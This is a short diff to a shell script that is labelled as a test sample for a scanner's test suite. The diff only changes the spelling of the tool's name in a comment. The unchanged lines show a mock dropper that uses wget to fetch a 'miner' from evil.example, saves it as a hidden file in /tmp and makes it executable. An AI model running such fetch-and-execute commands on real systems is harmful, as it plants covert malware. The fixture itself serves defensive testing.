@@ -1,5 +1,5 @@
 #!/bin/sh
-# TEST SAMPLE ONLY - never execute. Used by pipeguard's test suite.
+# TEST SAMPLE ONLY - never execute. Used by pipegaurd's test suite.
 # Drops a hidden "miner" in /tmp, makes it survive reboots, lowers defences.
 wget -q http://evil.example/miner -O /tmp/.cache-update
 chmod +x /tmp/.cache-update
